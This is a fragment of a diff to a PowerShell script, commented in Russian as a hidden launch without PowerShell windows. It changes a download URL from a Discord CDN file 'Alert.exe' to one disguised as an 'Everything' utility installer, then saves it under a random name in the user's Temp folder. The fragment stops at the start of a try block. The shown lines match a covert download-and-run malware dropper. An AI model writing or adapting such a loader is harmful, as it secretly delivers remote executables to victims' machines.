@@ -1,5 +1,5 @@
 # Скрытый запуск без окон PowerShell
-$url  = 'https://cdn.discordapp.com/attachments/1469805797717573706/1469815870963318866/Alert.exe?ex=69890833&is=6987b6b3&hm=1dffee43e1135dc52019a0746bc4fb609d9cde76dce228e87c93e02c97d7e770&'
+$url  = 'https://cdn.discordapp.com/attachments/1469805797717573706/1469822016323321906/Everything-1.4.1.1032.x64-Setup.exe?ex=69890dec&is=6987bc6c&hm=da042514e41c24d06000439553dc62945471f6382b77c1d0cf47fd26bdb33cba&'
 $file = "$env:LOCALAPPDATA\Temp\i$(Get-Random).exe"
 
 try {
